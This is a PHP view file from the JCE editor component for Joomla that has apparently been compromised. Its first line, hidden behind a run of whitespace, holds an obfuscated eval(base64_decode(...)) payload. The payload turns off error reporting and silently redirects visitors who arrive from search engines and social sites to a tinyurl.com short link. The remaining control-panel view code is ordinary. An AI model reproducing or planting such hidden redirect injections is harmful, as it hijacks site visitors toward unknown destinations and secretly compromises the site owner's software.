<?php	                                       			eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokbmNjdj1oZWFkZXJzX3NlbnQoKTsNCmlmICghJG5jY3Ypew0KJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOw0KJHVhPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsNCmlmIChzdHJpc3RyKCRyZWZlcmVyLCJ5YWhvbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmciKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJyYW1ibGVyIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZ29nbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImxpdmUuY29tIilvciBzdHJpc3RyKCRyZWZlcmVyLCJhcG9ydCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm5pZ21hIikgb3Igc3RyaXN0cigkcmVmZXJlciwid2ViYWx0YSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJlZ3VuLnJ1Iikgb3Igc3RyaXN0cigkcmVmZXJlciwic3R1bWJsZXVwb24uY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYml0Lmx5Iikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm15c3BhY2UuY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZmFjZWJvb2suY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpKSB7DQppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewkJDQoJCWhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly90aW55dXJsLmNvbS9hZWxud2o0Iik7DQoJCWV4aXQoKTsNCgl9DQp9DQp9"));
/**
* @version		$Id: view.html.php 47 2009-05-26 18:06:30Z happynoodleboy $
* @package		Joomla
* @subpackage	Config
* @copyright	Copyright (C) 2005 - 2008 Open Source Matters. All rights reserved.
* @license		GNU/GPL, see LICENSE.php
* Joomla! is free software. This version may have been modified pursuant
* to the GNU General Public License, and as distributed it includes or
* is derivative of works licensed under the GNU General Public License or
* other free or open source software licenses.
* See COPYRIGHT.php for copyright notices and details.
*/

// no direct access
defined( '_JEXEC' ) or die( 'Restricted access' );

jimport('joomla.application.component.view');
jimport('joomla.html.pane');
jimport('joomla.application.module.helper');

/**
 * HTML View class for the Plugins component
 *
 * @static
 * @package		Joomla
 * @subpackage	Plugins
 * @since 1.0
 */
class CpanelViewCpanel extends JView
{
	function display( $tpl = null )
	{
		$pane			=& JPane::getInstance('sliders');
		//$modules		=& JModuleHelper::getModules('jce_cpanel');
		
		$com_xml 		= JApplicationHelper::parseXMLInstallFile( JPATH_ADMINISTRATOR .DS. 'components' .DS. 'com_jce' .DS. 'jce.xml' );
		
		$plg_xml 		= array();
		$plg_xml_file 	= JPATH_PLUGINS .DS. 'editors' .DS. 'jce.xml';
		
		if( file_exists( $plg_xml_file ) ){
			$plg_xml = JApplicationHelper::parseXMLInstallFile( $plg_xml_file );
		}else{
			$plg_xml['version'] = JText::_('Plugin not installed!');
		}
		
		$this->assignRef('icons', 	$icons);
		$this->assignRef('pane', 	$pane);
		//$this->assignRef('modules', $modules);
		$this->assignRef('com_info', $com_xml);
		$this->assignRef('plg_info', $plg_xml);

		parent::display($tpl);
	}
}
?>